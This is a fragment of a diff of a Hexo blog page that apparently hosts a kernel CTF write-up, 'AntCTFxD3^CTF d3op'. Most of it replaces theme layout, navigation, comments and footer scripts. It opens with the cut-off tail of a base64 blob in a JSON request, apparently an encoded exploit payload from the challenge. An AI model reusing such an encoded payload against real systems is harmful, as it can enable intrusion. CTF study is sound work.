class="hljs-string">&quot;7sWM0o4trPLuDMDy7g8f+IDzn9Lg/7/y4P/f8uD///LhAwCR4gMfqggHgNIBAADUYACA0oF0hNJBCaDyAiCA0ugHgNIBAADU4wMAquEBAFgCAgBYYWgiOAECAFgiAgBYYWgiOCAAgNIBc4TSQQmg8gIggNIICIDSAQAA1GABAFiJAQBYIAE/1iIAAAAAAAAAoyNKAAAAAAB9AAAAAAAAAKQjSgAAAAAAAQAAAAAAAABgLUIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwSgAAAAAAACBKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAeyJvdXRwdXQiOiAiAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEEAAABBAAAAQQAAAEEAAABBAAAAQQAAABgGAAAdBAAAhAUAAJIEAAAAJUoAAAAAALiURAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAJUoAAAAAAKR5RQAAAAAACB5KAAAAAABCQkJCQkJCQkNDQ0NDQ0NDmCBKAAAAAABFRUVFRUVFRQ==&quot;</span><br>            &#125;<br>        ]<br>    &#125;&#x27;<br></code></pre></td></tr></table></figure>
+        </div>
 
+    
 
-                
-              </div>
-            
-            <hr/>
-            <div>
-              <div class="post-metas my-3">
-  
-  
+</div>
+                <div class="footer">
+    <span>Copyright © 2022 鷺雨のBlog</span>
+    <span>Theme Designed By <a target="_blank" href="https://zheli.design/one-paper">這李設計</a></span>
 </div>
 
 
-              
-  
-
-  <div class="license-box my-3">
-    <div class="license-title">
-      <div>【WP】AntCTFxD3^CTF d3op</div>
-      <div>http://loora1n.github.io/2023/05/16/【kernel】AntCTFxD3^CTF d3op WP/</div>
-    </div>
-    <div class="license-meta">
-      
-        <div class="license-meta-item">
-          <div>作者</div>
-          <div>Loora1N</div>
-        </div>
-      
-      
-        <div class="license-meta-item license-meta-date">
-          <div>发布于</div>
-          <div>2023年5月16日</div>
-        </div>
-      
-      
-      
-        <div class="license-meta-item">
-          <div>许可协议</div>
-          <div>
-            
-              
-              
-                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
-                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
-                    <i class="iconfont icon-by"></i>
-                  </span>
-                </a>
-              
-            
-          </div>
-        </div>
-      
-    </div>
-    <div class="license-icon iconfont"></div>
-  </div>
+<link rel="stylesheet" href="/css/a11y-dark.min.css">
 
 
+<script src="/js/highlight.min.js"></script>
 
-              
-                <div class="post-prevnext my-3">
-                  <article class="post-prev col-6">
-                    
-                    
-                      <a href="/2023/07/10/%E6%9F%90%E5%B8%82%E7%94%B5%E7%BD%91%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%B0%8F%E8%AE%B0/" title="某市电网漏洞挖掘小记">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">某市电网漏洞挖掘小记</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
-                  </article>
-                  <article class="post-next col-6">
-                    
-                    
-                      <a href="/2023/04/25/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88CH8%E5%8F%8ACH23/" title="网络协议栈CH8及CH23">
-                        <span class="hidden-mobile">网络协议栈CH8及CH23</span>
-                        <span class="visible-mobile">下一篇</span>
-                        <i class="iconfont icon-arrowright"></i>
-                      </a>
-                    
-                  </article>
-                </div>
-              
+
+<script src="/js/highlightjs-line-numbers.js"></script>
+
+
+<script>
+    hljs.initHighlightingOnLoad();
+    hljs.initLineNumbersOnLoad();
+</script>
+
             </div>
-
-            
-  <article id="comments">
-    
-  <script type="text/javascript">
-    Fluid.utils.loadComments('#comments', function() {
-      var light = 'github-light';
-      var dark = 'github-dark';
-      var schema = document.documentElement.getAttribute('data-user-color-scheme');
-      if (schema === 'dark') {
-        schema = dark;
-      } else {
-        schema = light;
-      }
-      window.UtterancesThemeLight = light;
-      window.UtterancesThemeDark = dark;
-      var s = document.createElement('script');
-      s.setAttribute('src', 'https://utteranc.es/client.js');
-      s.setAttribute('repo', 'loora1n/comment');
-      s.setAttribute('issue-term', 'pathname');
-      
-      s.setAttribute('label', 'utterances');
-      
-      s.setAttribute('theme', schema);
-      s.setAttribute('crossorigin', 'anonymous');
-      document.getElementById('comments').appendChild(s);
-    })
-  </script>
-  <noscript>Please enable JavaScript to view the comments</noscript>
-
-
-  </article>
-
-
-          </article>
         </div>
-      </div>
-    </div>
-
-    <div class="side-col d-none d-lg-block col-lg-2">
-      
-  <aside class="sidebar" style="margin-left: -1rem">
-    <div id="toc">
-  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
-  <div class="toc-body" id="toc-body"></div>
-</div>
-
-
-
-  </aside>
-
-
-    </div>
-  </div>
-</div>
-
-
-
-
-
-  
-
-
-
-  
-
-
-
-  
-
-
-
-  
-
-
-
-  
-
-
-
-
-
-
-
-    
-
-    
-      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
-        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
-      </a>
-    
-
-    
-      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
-     aria-hidden="true">
-  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
-    <div class="modal-content">
-      <div class="modal-header text-center">
-        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
-        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
-          <span aria-hidden="true">&times;</span>
-        </button>
-      </div>
-      <div class="modal-body mx-3">
-        <div class="md-form mb-5">
-          <input type="text" id="local-search-input" class="form-control validate">
-          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
-        </div>
-        <div class="list-group" id="local-search-result"></div>
-      </div>
-    </div>
-  </div>
-</div>
-
-    
-
-    
-  </main>
-
-  <footer>
-    <div class="footer-inner">
-  
-    <div class="footer-content">
-       <a href="https://github.com/Loora1N" target="_blank" rel="nofollow noopener"><span>Loora1N</span></a> <i class="iconfont icon-love"></i> <a href="https://space.bilibili.com/33242548?spm_id_from=333.1007.0.0" target="_blank" rel="nofollow noopener"><span>鷺雨君</span></a>
-    </div>
-  
-  
-    <div class="statistics">
-  
-  
-
-  
-    
-      <span id="leancloud-site-pv-container" style="display: none">
-        总访问量 
-        <span id="leancloud-site-pv"></span>
-         次
-      </span>
-    
-    
-      <span id="leancloud-site-uv-container" style="display: none">
-        总访客数 
-        <span id="leancloud-site-uv"></span>
-         人
-      </span>
-    
-    
-
-  
-</div>
-
-  
-  
-  
-  <span id="timeDate">载入天数...</span>
-  <span id="times">载入时分秒...</span>
-  <script>
-  var now = new Date();
-  function createtime(){
-      var grt= new Date("06/03/2022 00:00:00");//此处修改你的建站时间或者网站上线时间
-      now.setTime(now.getTime()+250);
-      days = (now - grt ) / 1000 / 60 / 60 / 24;
-      dnum = Math.floor(days);
-      hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum);
-      hnum = Math.floor(hours);
-      if(String(hnum).length ==1 ){
-          hnum = "0" + hnum;
-      }
-      minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
-      mnum = Math.floor(minutes);
-      if(String(mnum).length ==1 ){
-                mnum = "0" + mnum;
-      }
-      seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
-      snum = Math.round(seconds);
-      if(String(snum).length ==1 ){
-                snum = "0" + snum;
-      }
-      document.getElementById("timeDate").innerHTML = "🚀running🚀 for&nbsp"+dnum+"&nbspdays";  //此次自定义显示内容
-      document.getElementById("times").innerHTML = hnum + "&nbsphr&nbsp" + mnum + "&nbspmin&nbsp" + snum + "&nbspsec";
-  }  //此次自定义显示内容
-  setInterval("createtime()",250);
-  </script>   
-</div>
-
-  </footer>
-
-  <!-- Scripts -->
-  
-  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
-  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
-
-  <script>
-    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
-    NProgress.start()
-    window.addEventListener('load', function() {
-      NProgress.done();
-    })
-  </script>
-
-
-<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
-<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
-<script  src="/js/events.js" ></script>
-<script  src="/js/plugins.js" ></script>
-
-
-  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
-  <script>
-    (function (window, document) {
-      var typing = Fluid.plugins.typing;
-      var subtitle = document.getElementById('subtitle');
-      if (!subtitle || !typing) {
-        return;
-      }
-      var text = subtitle.getAttribute('data-typed-text');
-      
-        typing(text);
-      
-    })(window, document);
-  </script>
-
-
-
-
-
-
-
-  
-<script>
-  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
-    var toc = jQuery('#toc');
-    if (toc.length === 0 || !window.tocbot) { return; }
-    var boardCtn = jQuery('#board-ctn');
-    var boardTop = boardCtn.offset().top;
-
-    window.tocbot.init(Object.assign({
-      tocSelector     : '#toc-body',
-      contentSelector : '.markdown-body',
-      linkClass       : 'tocbot-link',
-      activeLinkClass : 'tocbot-active-link',
-      listClass       : 'tocbot-list',
-      isCollapsedClass: 'tocbot-is-collapsed',
-      collapsibleClass: 'tocbot-is-collapsible',
-      scrollSmooth    : true,
-      includeTitleTags: true,
-      headingsOffset  : -boardTop,
-    }, CONFIG.toc));
-    if (toc.find('.toc-list-item').length > 0) {
-      toc.css('visibility', 'visible');
-    }
-
-    Fluid.events.registerRefreshCallback(function() {
-      if ('tocbot' in window) {
-        tocbot.refresh();
-        var toc = jQuery('#toc');
-        if (toc.length === 0 || !tocbot) {
-          return;
-        }
-        if (toc.find('.toc-list-item').length > 0) {
-          toc.css('visibility', 'visible');
-        }
-      }
-    });
-  });
-</script>
-
-
-  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>
-
-  <script>Fluid.plugins.codeWidget();</script>
-
-
-  
-<script>
-  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
-    window.anchors.options = {
-      placement: CONFIG.anchorjs.placement,
-      visible  : CONFIG.anchorjs.visible
-    };
-    if (CONFIG.anchorjs.icon) {
-      window.anchors.options.icon = CONFIG.anchorjs.icon;
-    }
-    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
-    var res = [];
-    for (var item of el) {
-      res.push('.markdown-body > ' + item.trim());
-    }
-    if (CONFIG.anchorjs.placement === 'left') {
-      window.anchors.options.class = 'anchorjs-link-left';
-    }
-    window.anchors.add(res.join(', '));
-
-    Fluid.events.registerRefreshCallback(function() {
-      if ('anchors' in window) {
-        anchors.removeAll();
-        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
-        var res = [];
-        for (var item of el) {
-          res.push('.markdown-body > ' + item.trim());
-        }
-        if (CONFIG.anchorjs.placement === 'left') {
-          anchors.options.class = 'anchorjs-link-left';
-        }
-        anchors.add(res.join(', '));
-      }
-    });
-  });
-</script>
-
-
-  
-<script>
-  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
-    Fluid.plugins.fancyBox();
-  });
-</script>
-
-
-  <script>Fluid.plugins.imageCaption();</script>
-
-  <script defer src="/js/leancloud.js" ></script>
-
-  <script  src="/js/local-search.js" ></script>
-
-
-
-
-  
-<script src="//cdn.jsdelivr.net/gh/bynotes/texiao/source/js/xiantiao.js"></script>
-<script src="//cdn.jsdelivr.net/gh/bynotes/texiao/source/js/love.js"></script>
-<script src="//cdn.jsdelivr.net/gh/bynotes/texiao/source/js/caidai.js"></script>
-
-
-
-<!-- 主题的启动项，将它保持在最底部 -->
-<!-- the boot of the theme, keep it at the bottom -->
-<script  src="/js/boot.js" ></script>
-
-
-  
-
-  <noscript>
-    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
-  </noscript>
-<!-- hexo injector body_end start -->
+    <!-- hexo injector body_end start -->
   <script data-pjax src="https://cdn.jsdelivr.net/gh/Zfour/hexo-github-calendar@1.21/hexo_githubcalendar.js"></script>
   <script data-pjax>
         function GithubCalendarConfig(){
